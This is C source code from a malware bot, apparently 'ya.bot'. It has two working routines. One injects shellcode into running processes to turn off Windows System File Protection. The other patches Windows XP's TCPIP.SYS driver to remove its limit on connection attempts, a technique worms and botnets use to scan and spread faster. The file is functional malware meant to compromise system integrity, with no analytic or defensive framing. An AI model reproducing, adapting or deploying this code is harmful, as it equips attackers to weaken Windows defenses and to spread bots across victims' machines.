/*  ya.bot  */

#include "bot.h"

#ifndef NO_PATCH

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code by Z0MBiE
//botbotbotbotbotbotbotbotbotbotbotbotbot

bool patch_sfcdisable()
{
	char *sfc_patchdata =
		"\x68\xE8\x03\x00\x00\xB8\x00\x00\x00\x00\xFF\xD0\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xEB\xE1";
	char *sfc_sign =
		"\x6A\x00\x6A\x01\x6A\x01\xFF\x33\xFF\x73\x04\xFF\x15";
	BYTE byOrgBytes[31];
	char szBuffer[260];
	DWORD dwPatchAddr = 0, dwPID[8192], dwSize, dwWritten, dwOld, i, j;
	HANDLE hProcess;
	HMODULE hLibrary, hModule[8192];
	LPVOID lpAddr;

#ifndef NO_DEBUG
			debug_print("Disabling SFC, patch_sfcdisable()");
#endif
			
		hLibrary = LoadLibraryEx(string_patchsfcoslibrary, NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!hLibrary)
			return FALSE;
	for (i = (DWORD)hLibrary;; i++)
	{
		if (IsBadReadPtr((BYTE *)i, 11) != 0)
				break;
		if (memcmp((BYTE *)i, sfc_sign, 13) == 0)
		{
				dwPatchAddr = i + (- 12) - (DWORD)hLibrary;
				memcpy(byOrgBytes, (BYTE *)(i + (- 12)), sizeof(byOrgBytes));
				break;
		}
	}
		FreeLibrary(hLibrary);
	if (!dwPatchAddr)
			return FALSE;
		*(FARPROC*)&sfc_patchdata[6] = GetProcAddress(LoadLibrary(string_kernel32library),
				string_patchsleepfunction);
	if (EnumProcesses(dwPID, sizeof(dwPID), &dwSize) == 0)
			return FALSE;
	for (i = 1; (i < sizeof(dwPID) / 4) && (dwPID[i] != 0); i++)
	{
		if (dwPID[i] != 8) //8 == SYSTEM
		{
				hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						0,
						dwPID[i]);
			if (hProcess != INVALID_HANDLE_VALUE)
			{
				if (EnumProcessModules(hProcess, hModule, sizeof(hModule), &dwSize) != 0)
				{
					for (j = 0;
							(j < sizeof(hModule) / 4) && (hModule[j] != 0) && (j * 4 < dwSize);
							j++)
					{
						if (GetModuleBaseName(hProcess, hModule[j], szBuffer, sizeof(szBuffer)))
						{
							if (stricmp(szBuffer, string_patchsfcoslibrary) == 0)
							{
									lpAddr = (LPVOID)((DWORD)hModule[j] + dwPatchAddr);
								if (VirtualProtectEx(hProcess,
											lpAddr,
											31,
											PAGE_EXECUTE_READWRITE,
											&dwOld) != 0)
										WriteProcessMemory(hProcess,
												lpAddr,
												sfc_patchdata,
												31,
												&dwWritten);
							}
						}
					}
				}
					CloseHandle(hProcess);
			}
		}
	}
		return TRUE;
}

bool patch_tcpip()
{
	SPatchBytes s_pb[5] =
	{
			{0x00130, "\x62"},
			{0x00131, "\x13"},
			{0x4F322, "\xFE"},
			{0x4F323, "\xFF"},
			{0x4F324, "\xFF"},
	};
	char szByte[2], szFilePath[MAX_PATH];
	FILE *f;
	int i; 

#ifndef NO_DEBUG
			debug_print("Patching TCPIP.SYS, patch_tcpip()");
#endif

	if (info_os() == OS_WINXP)
	{
			GetSystemDirectory(szFilePath, sizeof(szFilePath) - 1);
			strncat(szFilePath,
					string_patchtcpipfile,
					(sizeof(szFilePath) - strlen(szFilePath)) - 1);
		if (file_filesize(szFilePath) != 359808)
				return FALSE;
			f = fopen(szFilePath, string_filefopenreadwritebinary);
		if (!f)
				return FALSE;
			memset(szByte, 0, sizeof(szByte));
		if (fseek(f, s_pb[0].dwOffset, SEEK_SET) != 0)
				return FALSE;
		if (fread(szByte, 1, 1, f) != 1)
				return FALSE;
		if (strcmp(s_pb[0].pszValue, szByte) == 0)
				return FALSE;
		else if (strcmp("\xDB", szByte) != 0)
				return FALSE;
			patch_sfcdisable();
		for (i = 0; i < 5; i++)
		{
			if (fseek(f, s_pb[i].dwOffset, SEEK_SET) != 0)
					return FALSE;
			if (fwrite(s_pb[i].pszValue, 1, 1, f) != 1)
					return FALSE;
		}
			fclose(f);
			return TRUE;
	}
		return FALSE;
}
#endif